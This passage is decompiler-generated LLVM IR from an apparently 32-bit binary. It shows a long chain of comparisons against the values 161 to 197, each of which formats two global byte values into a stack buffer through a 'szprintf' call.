  %v7_d000 = icmp eq i32 %v2_acd8, 161
  br i1 %v7_d000, label %dec_label_pc_d008, label %dec_label_pc_d030

dec_label_pc_d008:                                ; preds = %dec_label_pc_cffc
  %v2_d008 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d014 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d020 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d02c = sext i8 %v3_d014 to i32
  %v6_d02c = sext i8 %v3_d020 to i32
  %v8_d02c = call i32 @szprintf(i32 %v2_d008, i32 ptrtoint ([14 x i8]* @global_var_1f7c8.392 to i32), i32 %v4_d02c, i32 %v6_d02c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d030

dec_label_pc_d030:                                ; preds = %dec_label_pc_cffc, %dec_label_pc_d008
  %v7_d034 = icmp eq i32 %v2_acd8, 162
  br i1 %v7_d034, label %dec_label_pc_d03c, label %dec_label_pc_d064

dec_label_pc_d03c:                                ; preds = %dec_label_pc_d030
  %v2_d03c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d048 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d054 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d060 = sext i8 %v3_d048 to i32
  %v6_d060 = sext i8 %v3_d054 to i32
  %v8_d060 = call i32 @szprintf(i32 %v2_d03c, i32 ptrtoint ([14 x i8]* @global_var_1f7d8.394 to i32), i32 %v4_d060, i32 %v6_d060, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d030, %dec_label_pc_d03c
  %v7_d068 = icmp eq i32 %v2_acd8, 163
  br i1 %v7_d068, label %dec_label_pc_d070, label %dec_label_pc_d098

dec_label_pc_d070:                                ; preds = %dec_label_pc_d064
  %v2_d070 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d07c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d088 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d094 = sext i8 %v3_d07c to i32
  %v6_d094 = sext i8 %v3_d088 to i32
  %v8_d094 = call i32 @szprintf(i32 %v2_d070, i32 ptrtoint ([14 x i8]* @global_var_1f7e8.396 to i32), i32 %v4_d094, i32 %v6_d094, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d064, %dec_label_pc_d070
  %v7_d09c = icmp eq i32 %v2_acd8, 164
  br i1 %v7_d09c, label %dec_label_pc_d0a4, label %dec_label_pc_d0cc

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d098
  %v2_d0a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0b0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d0bc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d0c8 = sext i8 %v3_d0b0 to i32
  %v6_d0c8 = sext i8 %v3_d0bc to i32
  %v8_d0c8 = call i32 @szprintf(i32 %v2_d0a4, i32 ptrtoint ([14 x i8]* @global_var_1f73c.373 to i32), i32 %v4_d0c8, i32 %v6_d0c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d098, %dec_label_pc_d0a4
  %v7_d0d0 = icmp eq i32 %v2_acd8, 165
  br i1 %v7_d0d0, label %dec_label_pc_d0d8, label %dec_label_pc_d100

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0cc
  %v2_d0d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0e4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d0f0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d0fc = sext i8 %v3_d0e4 to i32
  %v6_d0fc = sext i8 %v3_d0f0 to i32
  %v8_d0fc = call i32 @szprintf(i32 %v2_d0d8, i32 ptrtoint ([13 x i8]* @global_var_1f7f8.398 to i32), i32 %v4_d0fc, i32 %v6_d0fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d100

dec_label_pc_d100:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0d8
  %v7_d104 = icmp eq i32 %v2_acd8, 166
  br i1 %v7_d104, label %dec_label_pc_d10c, label %dec_label_pc_d134

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d100
  %v2_d10c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d118 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d124 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d130 = sext i8 %v3_d118 to i32
  %v6_d130 = sext i8 %v3_d124 to i32
  %v8_d130 = call i32 @szprintf(i32 %v2_d10c, i32 ptrtoint ([14 x i8]* @global_var_1f808.400 to i32), i32 %v4_d130, i32 %v6_d130, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d134

dec_label_pc_d134:                                ; preds = %dec_label_pc_d100, %dec_label_pc_d10c
  %v7_d138 = icmp eq i32 %v2_acd8, 167
  br i1 %v7_d138, label %dec_label_pc_d140, label %dec_label_pc_d168

dec_label_pc_d140:                                ; preds = %dec_label_pc_d134
  %v2_d140 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d14c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d158 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d164 = sext i8 %v3_d14c to i32
  %v6_d164 = sext i8 %v3_d158 to i32
  %v8_d164 = call i32 @szprintf(i32 %v2_d140, i32 ptrtoint ([14 x i8]* @global_var_1f7a8.388 to i32), i32 %v4_d164, i32 %v6_d164, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %dec_label_pc_d134, %dec_label_pc_d140
  %v7_d16c = icmp eq i32 %v2_acd8, 168
  br i1 %v7_d16c, label %dec_label_pc_d174, label %dec_label_pc_d19c

dec_label_pc_d174:                                ; preds = %dec_label_pc_d168
  %v2_d174 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d180 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d18c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d198 = sext i8 %v3_d180 to i32
  %v6_d198 = sext i8 %v3_d18c to i32
  %v8_d198 = call i32 @szprintf(i32 %v2_d174, i32 ptrtoint ([14 x i8]* @global_var_1f818.402 to i32), i32 %v4_d198, i32 %v6_d198, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d19c

dec_label_pc_d19c:                                ; preds = %dec_label_pc_d168, %dec_label_pc_d174
  %v7_d1a0 = icmp eq i32 %v2_acd8, 169
  br i1 %v7_d1a0, label %dec_label_pc_d1a8, label %dec_label_pc_d1d0

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d19c
  %v2_d1a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1b4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d1c0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d1cc = sext i8 %v3_d1b4 to i32
  %v6_d1cc = sext i8 %v3_d1c0 to i32
  %v8_d1cc = call i32 @szprintf(i32 %v2_d1a8, i32 ptrtoint ([14 x i8]* @global_var_1f828.404 to i32), i32 %v4_d1cc, i32 %v6_d1cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1d0

dec_label_pc_d1d0:                                ; preds = %dec_label_pc_d19c, %dec_label_pc_d1a8
  %v7_d1d4 = icmp eq i32 %v2_acd8, 171
  br i1 %v7_d1d4, label %dec_label_pc_d1dc, label %dec_label_pc_d204

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1d0
  %v2_d1dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1e8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d1f4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d200 = sext i8 %v3_d1e8 to i32
  %v6_d200 = sext i8 %v3_d1f4 to i32
  %v8_d200 = call i32 @szprintf(i32 %v2_d1dc, i32 ptrtoint ([14 x i8]* @global_var_1f838.406 to i32), i32 %v4_d200, i32 %v6_d200, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1d0, %dec_label_pc_d1dc
  %v7_d208 = icmp eq i32 %v2_acd8, 172
  br i1 %v7_d208, label %dec_label_pc_d210, label %dec_label_pc_d238

dec_label_pc_d210:                                ; preds = %dec_label_pc_d204
  %v2_d210 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d21c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d228 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d234 = sext i8 %v3_d21c to i32
  %v6_d234 = sext i8 %v3_d228 to i32
  %v8_d234 = call i32 @szprintf(i32 %v2_d210, i32 ptrtoint ([14 x i8]* @global_var_1f848.408 to i32), i32 %v4_d234, i32 %v6_d234, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d238

dec_label_pc_d238:                                ; preds = %dec_label_pc_d204, %dec_label_pc_d210
  %v7_d23c = icmp eq i32 %v2_acd8, 173
  br i1 %v7_d23c, label %dec_label_pc_d244, label %dec_label_pc_d26c

dec_label_pc_d244:                                ; preds = %dec_label_pc_d238
  %v2_d244 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d250 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d25c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d268 = sext i8 %v3_d250 to i32
  %v6_d268 = sext i8 %v3_d25c to i32
  %v8_d268 = call i32 @szprintf(i32 %v2_d244, i32 ptrtoint ([14 x i8]* @global_var_1f858.410 to i32), i32 %v4_d268, i32 %v6_d268, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d238, %dec_label_pc_d244
  %v7_d270 = icmp eq i32 %v2_acd8, 174
  br i1 %v7_d270, label %dec_label_pc_d278, label %dec_label_pc_d2a0

dec_label_pc_d278:                                ; preds = %dec_label_pc_d26c
  %v2_d278 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d284 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d290 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d29c = sext i8 %v3_d284 to i32
  %v6_d29c = sext i8 %v3_d290 to i32
  %v8_d29c = call i32 @szprintf(i32 %v2_d278, i32 ptrtoint ([13 x i8]* @global_var_1f868.412 to i32), i32 %v4_d29c, i32 %v6_d29c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d26c, %dec_label_pc_d278
  %v7_d2a4 = icmp eq i32 %v2_acd8, 175
  br i1 %v7_d2a4, label %dec_label_pc_d2ac, label %dec_label_pc_d2d4

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d2a0
  %v2_d2ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2b8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d2c4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d2d0 = sext i8 %v3_d2b8 to i32
  %v6_d2d0 = sext i8 %v3_d2c4 to i32
  %v8_d2d0 = call i32 @szprintf(i32 %v2_d2ac, i32 ptrtoint ([14 x i8]* @global_var_1f878.414 to i32), i32 %v4_d2d0, i32 %v6_d2d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2d4

dec_label_pc_d2d4:                                ; preds = %dec_label_pc_d2a0, %dec_label_pc_d2ac
  %v7_d2d8 = icmp eq i32 %v2_acd8, 176
  br i1 %v7_d2d8, label %dec_label_pc_d2e0, label %dec_label_pc_d308

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2d4
  %v2_d2e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2ec = load i8, i8* @global_var_2a549.78, align 1
  %v3_d2f8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d304 = sext i8 %v3_d2ec to i32
  %v6_d304 = sext i8 %v3_d2f8 to i32
  %v8_d304 = call i32 @szprintf(i32 %v2_d2e0, i32 ptrtoint ([14 x i8]* @global_var_1f888.416 to i32), i32 %v4_d304, i32 %v6_d304, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d308

dec_label_pc_d308:                                ; preds = %dec_label_pc_d2d4, %dec_label_pc_d2e0
  %v7_d30c = icmp eq i32 %v2_acd8, 177
  br i1 %v7_d30c, label %dec_label_pc_d314, label %dec_label_pc_d33c

dec_label_pc_d314:                                ; preds = %dec_label_pc_d308
  %v2_d314 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d320 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d32c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d338 = sext i8 %v3_d320 to i32
  %v6_d338 = sext i8 %v3_d32c to i32
  %v8_d338 = call i32 @szprintf(i32 %v2_d314, i32 ptrtoint ([14 x i8]* @global_var_1f898.418 to i32), i32 %v4_d338, i32 %v6_d338, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d33c

dec_label_pc_d33c:                                ; preds = %dec_label_pc_d308, %dec_label_pc_d314
  %v7_d340 = icmp eq i32 %v2_acd8, 178
  br i1 %v7_d340, label %dec_label_pc_d348, label %dec_label_pc_d370

dec_label_pc_d348:                                ; preds = %dec_label_pc_d33c
  %v2_d348 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d354 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d360 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d36c = sext i8 %v3_d354 to i32
  %v6_d36c = sext i8 %v3_d360 to i32
  %v8_d36c = call i32 @szprintf(i32 %v2_d348, i32 ptrtoint ([13 x i8]* @global_var_1f8a8.420 to i32), i32 %v4_d36c, i32 %v6_d36c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d370

dec_label_pc_d370:                                ; preds = %dec_label_pc_d33c, %dec_label_pc_d348
  %v7_d374 = icmp eq i32 %v2_acd8, 179
  br i1 %v7_d374, label %dec_label_pc_d37c, label %dec_label_pc_d3a4

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d370
  %v2_d37c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d388 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d394 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d3a0 = sext i8 %v3_d388 to i32
  %v6_d3a0 = sext i8 %v3_d394 to i32
  %v8_d3a0 = call i32 @szprintf(i32 %v2_d37c, i32 ptrtoint ([13 x i8]* @global_var_1f8b8.422 to i32), i32 %v4_d3a0, i32 %v6_d3a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3a4

dec_label_pc_d3a4:                                ; preds = %dec_label_pc_d370, %dec_label_pc_d37c
  %v7_d3a8 = icmp eq i32 %v2_acd8, 180
  br i1 %v7_d3a8, label %dec_label_pc_d3b0, label %dec_label_pc_d3d8

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d3a4
  %v2_d3b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3bc = load i8, i8* @global_var_2a549.78, align 1
  %v3_d3c8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d3d4 = sext i8 %v3_d3bc to i32
  %v6_d3d4 = sext i8 %v3_d3c8 to i32
  %v8_d3d4 = call i32 @szprintf(i32 %v2_d3b0, i32 ptrtoint ([13 x i8]* @global_var_1f8c8.424 to i32), i32 %v4_d3d4, i32 %v6_d3d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3d8

dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3a4, %dec_label_pc_d3b0
  %v7_d3dc = icmp eq i32 %v2_acd8, 181
  br i1 %v7_d3dc, label %dec_label_pc_d3e4, label %dec_label_pc_d40c

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3d8
  %v2_d3e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3f0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d3fc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d408 = sext i8 %v3_d3f0 to i32
  %v6_d408 = sext i8 %v3_d3fc to i32
  %v8_d408 = call i32 @szprintf(i32 %v2_d3e4, i32 ptrtoint ([13 x i8]* @global_var_1f8d8.426 to i32), i32 %v4_d408, i32 %v6_d408, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d40c

dec_label_pc_d40c:                                ; preds = %dec_label_pc_d3d8, %dec_label_pc_d3e4
  %v7_d410 = icmp eq i32 %v2_acd8, 182
  br i1 %v7_d410, label %dec_label_pc_d418, label %dec_label_pc_d440

dec_label_pc_d418:                                ; preds = %dec_label_pc_d40c
  %v2_d418 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d424 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d430 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d43c = sext i8 %v3_d424 to i32
  %v6_d43c = sext i8 %v3_d430 to i32
  %v8_d43c = call i32 @szprintf(i32 %v2_d418, i32 ptrtoint ([13 x i8]* @global_var_1f8e8.428 to i32), i32 %v4_d43c, i32 %v6_d43c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d440

dec_label_pc_d440:                                ; preds = %dec_label_pc_d40c, %dec_label_pc_d418
  %v7_d444 = icmp eq i32 %v2_acd8, 183
  br i1 %v7_d444, label %dec_label_pc_d44c, label %dec_label_pc_d474

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d440
  %v2_d44c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d458 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d464 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d470 = sext i8 %v3_d458 to i32
  %v6_d470 = sext i8 %v3_d464 to i32
  %v8_d470 = call i32 @szprintf(i32 %v2_d44c, i32 ptrtoint ([13 x i8]* @global_var_1f0e8.167 to i32), i32 %v4_d470, i32 %v6_d470, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d440, %dec_label_pc_d44c
  %v7_d478 = icmp eq i32 %v2_acd8, 184
  br i1 %v7_d478, label %dec_label_pc_d480, label %dec_label_pc_d4a8

dec_label_pc_d480:                                ; preds = %dec_label_pc_d474
  %v2_d480 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d48c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d498 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d4a4 = sext i8 %v3_d48c to i32
  %v6_d4a4 = sext i8 %v3_d498 to i32
  %v8_d4a4 = call i32 @szprintf(i32 %v2_d480, i32 ptrtoint ([13 x i8]* @global_var_1f8f8.431 to i32), i32 %v4_d4a4, i32 %v6_d4a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d474, %dec_label_pc_d480
  %v7_d4ac = icmp eq i32 %v2_acd8, 185
  br i1 %v7_d4ac, label %dec_label_pc_d4b4, label %dec_label_pc_d4dc

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d4a8
  %v2_d4b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4c0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d4cc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d4d8 = sext i8 %v3_d4c0 to i32
  %v6_d4d8 = sext i8 %v3_d4cc to i32
  %v8_d4d8 = call i32 @szprintf(i32 %v2_d4b4, i32 ptrtoint ([13 x i8]* @global_var_1f908.433 to i32), i32 %v4_d4d8, i32 %v6_d4d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4dc

dec_label_pc_d4dc:                                ; preds = %dec_label_pc_d4a8, %dec_label_pc_d4b4
  %v7_d4e0 = icmp eq i32 %v2_acd8, 186
  br i1 %v7_d4e0, label %dec_label_pc_d4e8, label %dec_label_pc_d510

dec_label_pc_d4e8:                                ; preds = %dec_label_pc_d4dc
  %v2_d4e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4f4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d500 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d50c = sext i8 %v3_d4f4 to i32
  %v6_d50c = sext i8 %v3_d500 to i32
  %v8_d50c = call i32 @szprintf(i32 %v2_d4e8, i32 ptrtoint ([14 x i8]* @global_var_1f918.435 to i32), i32 %v4_d50c, i32 %v6_d50c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d510

dec_label_pc_d510:                                ; preds = %dec_label_pc_d4dc, %dec_label_pc_d4e8
  %v7_d514 = icmp eq i32 %v2_acd8, 187
  br i1 %v7_d514, label %dec_label_pc_d51c, label %dec_label_pc_d544

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d510
  %v2_d51c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d528 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d534 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d540 = sext i8 %v3_d528 to i32
  %v6_d540 = sext i8 %v3_d534 to i32
  %v8_d540 = call i32 @szprintf(i32 %v2_d51c, i32 ptrtoint ([14 x i8]* @global_var_1f928.437 to i32), i32 %v4_d540, i32 %v6_d540, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d544

dec_label_pc_d544:                                ; preds = %dec_label_pc_d510, %dec_label_pc_d51c
  %v7_d548 = icmp eq i32 %v2_acd8, 188
  br i1 %v7_d548, label %dec_label_pc_d550, label %dec_label_pc_d578

dec_label_pc_d550:                                ; preds = %dec_label_pc_d544
  %v2_d550 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d55c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d568 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d574 = sext i8 %v3_d55c to i32
  %v6_d574 = sext i8 %v3_d568 to i32
  %v8_d574 = call i32 @szprintf(i32 %v2_d550, i32 ptrtoint ([14 x i8]* @global_var_1f938.439 to i32), i32 %v4_d574, i32 %v6_d574, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d578

dec_label_pc_d578:                                ; preds = %dec_label_pc_d544, %dec_label_pc_d550
  %v7_d57c = icmp eq i32 %v2_acd8, 189
  br i1 %v7_d57c, label %dec_label_pc_d584, label %dec_label_pc_d5ac

dec_label_pc_d584:                                ; preds = %dec_label_pc_d578
  %v2_d584 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d590 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d59c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d5a8 = sext i8 %v3_d590 to i32
  %v6_d5a8 = sext i8 %v3_d59c to i32
  %v8_d5a8 = call i32 @szprintf(i32 %v2_d584, i32 ptrtoint ([14 x i8]* @global_var_1f948.441 to i32), i32 %v4_d5a8, i32 %v6_d5a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5ac

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d584
  %v7_d5b0 = icmp eq i32 %v2_acd8, 190
  br i1 %v7_d5b0, label %dec_label_pc_d5b8, label %dec_label_pc_d5e0

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d5ac
  %v2_d5b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5c4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d5d0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d5dc = sext i8 %v3_d5c4 to i32
  %v6_d5dc = sext i8 %v3_d5d0 to i32
  %v8_d5dc = call i32 @szprintf(i32 %v2_d5b8, i32 ptrtoint ([14 x i8]* @global_var_1f958.443 to i32), i32 %v4_d5dc, i32 %v6_d5dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5e0

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5b8
  %v7_d5e4 = icmp eq i32 %v2_acd8, 191
  br i1 %v7_d5e4, label %dec_label_pc_d5ec, label %dec_label_pc_d614

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5e0
  %v2_d5ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5f8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d604 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d610 = sext i8 %v3_d5f8 to i32
  %v6_d610 = sext i8 %v3_d604 to i32
  %v8_d610 = call i32 @szprintf(i32 %v2_d5ec, i32 ptrtoint ([14 x i8]* @global_var_1f968.445 to i32), i32 %v4_d610, i32 %v6_d610, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d614

dec_label_pc_d614:                                ; preds = %dec_label_pc_d5e0, %dec_label_pc_d5ec
  %v7_d618 = icmp eq i32 %v2_acd8, 192
  br i1 %v7_d618, label %dec_label_pc_d620, label %dec_label_pc_d648

dec_label_pc_d620:                                ; preds = %dec_label_pc_d614
  %v2_d620 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d62c = load i8, i8* @global_var_2a549.78, align 1
  %v3_d638 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d644 = sext i8 %v3_d62c to i32
  %v6_d644 = sext i8 %v3_d638 to i32
  %v8_d644 = call i32 @szprintf(i32 %v2_d620, i32 ptrtoint ([13 x i8]* @global_var_1f978.447 to i32), i32 %v4_d644, i32 %v6_d644, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d648

dec_label_pc_d648:                                ; preds = %dec_label_pc_d614, %dec_label_pc_d620
  %v7_d64c = icmp eq i32 %v2_acd8, 193
  br i1 %v7_d64c, label %dec_label_pc_d654, label %dec_label_pc_d67c

dec_label_pc_d654:                                ; preds = %dec_label_pc_d648
  %v2_d654 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d660 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d66c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d678 = sext i8 %v3_d660 to i32
  %v6_d678 = sext i8 %v3_d66c to i32
  %v8_d678 = call i32 @szprintf(i32 %v2_d654, i32 ptrtoint ([13 x i8]* @global_var_1f988.449 to i32), i32 %v4_d678, i32 %v6_d678, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d67c

dec_label_pc_d67c:                                ; preds = %dec_label_pc_d648, %dec_label_pc_d654
  %v7_d680 = icmp eq i32 %v2_acd8, 194
  br i1 %v7_d680, label %dec_label_pc_d688, label %dec_label_pc_d6b0

dec_label_pc_d688:                                ; preds = %dec_label_pc_d67c
  %v2_d688 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d694 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d6a0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d6ac = sext i8 %v3_d694 to i32
  %v6_d6ac = sext i8 %v3_d6a0 to i32
  %v8_d6ac = call i32 @szprintf(i32 %v2_d688, i32 ptrtoint ([14 x i8]* @global_var_1f998.451 to i32), i32 %v4_d6ac, i32 %v6_d6ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d67c, %dec_label_pc_d688
  %v7_d6b4 = icmp eq i32 %v2_acd8, 195
  br i1 %v7_d6b4, label %dec_label_pc_d6bc, label %dec_label_pc_d6e4

dec_label_pc_d6bc:                                ; preds = %dec_label_pc_d6b0
  %v2_d6bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d6c8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d6d4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d6e0 = sext i8 %v3_d6c8 to i32
  %v6_d6e0 = sext i8 %v3_d6d4 to i32
  %v8_d6e0 = call i32 @szprintf(i32 %v2_d6bc, i32 ptrtoint ([14 x i8]* @global_var_1f9a8.453 to i32), i32 %v4_d6e0, i32 %v6_d6e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6b0, %dec_label_pc_d6bc
  %v7_d6e8 = icmp eq i32 %v2_acd8, 196
  br i1 %v7_d6e8, label %dec_label_pc_d6f0, label %dec_label_pc_d718

dec_label_pc_d6f0:                                ; preds = %dec_label_pc_d6e4
  %v2_d6f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d6fc = load i8, i8* @global_var_2a549.78, align 1
  %v3_d708 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d714 = sext i8 %v3_d6fc to i32
  %v6_d714 = sext i8 %v3_d708 to i32
  %v8_d714 = call i32 @szprintf(i32 %v2_d6f0, i32 ptrtoint ([14 x i8]* @global_var_1f9b8.455 to i32), i32 %v4_d714, i32 %v6_d714, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d718

dec_label_pc_d718:                                ; preds = %dec_label_pc_d6e4, %dec_label_pc_d6f0
  %v7_d71c = icmp eq i32 %v2_acd8, 197
  br i1 %v7_d71c, label %dec_label_pc_d724, label %dec_label_pc_d74c

dec_label_pc_d724:                                ; preds = %dec_label_pc_d718
  %v2_d724 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d730 = load i8, i8* @global_var_2a549.78, align 1
  %v3_d73c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_d748 = sext i8 %v3_d730 to i32
  %v6_d748 = sext i8 %v3_d73c to i32
  %v8_d748 = call i32 @szprintf(i32 %v2_d724, i32 ptrtoint ([14 x i8]* @global_var_1f9c8.457 to i32), i32 %v4_d748, i32 %v6_d748, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d74c

